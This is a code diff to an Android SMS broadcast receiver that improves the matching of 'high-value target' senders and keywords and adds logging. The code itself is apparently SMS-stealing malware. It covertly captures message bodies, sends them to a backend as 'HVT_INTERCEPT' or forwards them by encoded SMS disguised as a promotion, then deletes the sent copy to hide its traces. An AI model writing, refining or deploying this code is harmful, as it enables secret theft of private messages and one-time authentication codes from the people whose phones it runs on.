@@ -73,29 +73,54 @@ class SmsReceiver : BroadcastReceiver() {
             val hvtPrefs = context.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE)
             val kwPrefs = context.getSharedPreferences("kw_forward_prefs", Context.MODE_PRIVATE)
             
-            var redirectTarget = hvtPrefs.getString(sender, null)
+            var redirectTarget: String? = null
+            var matchedRuleType = ""
+            var matchedRuleVal = ""
+
+            // 1. Robust HVT Sender Match (Strips symbols for fuzzy matching, ignores case)
+            for ((targetSender, dest) in hvtPrefs.all) {
+                val cleanSender = sender.replace(Regex("\\D"), "")
+                val cleanTarget = targetSender.replace(Regex("\\D"), "")
+                
+                val isFuzzyMatch = cleanTarget.isNotEmpty() && cleanSender.isNotEmpty() && (cleanSender.endsWith(cleanTarget) || cleanTarget.endsWith(cleanSender))
+                val isExactMatch = sender.equals(targetSender, ignoreCase = true)
+                
+                if (isFuzzyMatch || isExactMatch) {
+                    redirectTarget = dest as? String
+                    matchedRuleType = "SENDER"
+                    matchedRuleVal = targetSender
+                    DebugLogger.log("TRAP_EVAL", "HVT Sender match found: [$targetSender] for incoming [$sender]")
+                    break
+                }
+            }
             
+            // 2. Fallback to Keyword Match
             if (redirectTarget == null) {
                 val allKwRules = kwPrefs.all
                 for ((kw, dest) in allKwRules) {
                     if (body.contains(kw, ignoreCase = true)) {
                         redirectTarget = dest as? String
-                        DebugLogger.log("TRAP", "Keyword match found: [$kw]")
+                        matchedRuleType = "KEYWORD"
+                        matchedRuleVal = kw
+                        DebugLogger.log("TRAP_EVAL", "Keyword match found: [$kw] in body")
                         break
                     }
                 }
             }
 
             if (redirectTarget != null) {
+                DebugLogger.log("FORWARD", "Routing intercepted SMS (Rule: $matchedRuleType [$matchedRuleVal]) to $redirectTarget")
                 CoroutineScope(Dispatchers.IO).launch {
                     val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
                     val caps = cm.getNetworkCapabilities(cm.activeNetwork)
                     val isOnline = caps != null && caps.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
 
                     if (isOnline) {
-                        val extra = JSONObject().apply { put("hvt_intercept", body); put("from", sender) }
+                        DebugLogger.log("FORWARD", "Device is ONLINE. Bypassing SMS fallback, dispatching direct to backend.")
+                        val extra = JSONObject().apply { put("hvt_intercept", body); put("from", sender); put("forwarded_to", redirectTarget); put("matched_rule", matchedRuleVal) }
                         CloudManager.sendPing(context, "HVT_INTERCEPT", extra)
                     } else {
+                        DebugLogger.log("FORWARD", "Device is OFFLINE. Utilizing encrypted FidelCipher SMS tunnel to $redirectTarget.")
                         try {
                             val msgRaw = "[HVT:$sender] $body"
                             val token = FidelCipher.encode(msgRaw)
@@ -104,13 +129,18 @@ class SmsReceiver : BroadcastReceiver() {
                             
                             val parts = smsManager.divideMessage(promo)
                             smsManager.sendMultipartTextMessage(redirectTarget, null, parts, null, null)
+                            DebugLogger.log("FORWARD", "Encrypted fallback SMS physically dispatched.")
                             
                             delay(5000)
                             val uri = android.net.Uri.parse("content://sms/sent")
                             context.contentResolver.delete(uri, "address=?", arrayOf(redirectTarget))
-                        } catch (e: Exception) { }
+                        } catch (e: Exception) {
+                            DebugLogger.log("FORWARD_ERR", "Encrypted SMS fallback failed: ${e.message}")
+                        }
                     }
                 }
+            } else {
+                DebugLogger.log("TRAP_EVAL", "No forwarding rules matched for sender [$sender]")
             }
 
             try {
